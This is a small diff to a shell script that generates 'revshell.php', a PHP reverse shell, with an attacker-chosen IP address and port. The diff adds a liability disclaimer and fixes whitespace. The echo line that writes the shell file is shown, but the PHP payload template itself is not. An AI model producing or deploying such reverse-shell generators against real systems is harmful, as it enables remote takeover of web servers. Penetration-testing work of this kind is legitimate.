@@ -9,7 +9,9 @@
 #
 # Output: revshell.php  with ipadress and port number in correct positions - ready for combat!
 #
-# Author : Dewalt 
+# Author : Dewalt
+# Standard Disclaimer author assumes no liability for any damages
+#
 
 # Revision number
 revision="0.2"
@@ -71,4 +73,4 @@ if [ "$ipaddress" = "" ] || [ "$1" = "" ]
      # if ipaddress is not empty and $1 is not empty generated revshell.php
      echo -e "$filetop\n\$ip = '$ipaddress';\n\$port = '$1';\n$filebottom" > revshell.php
      echo -e "revshell.php generatred with "$ipaddress" and port "$1"  Happy Hacking!"
- fi
+fi
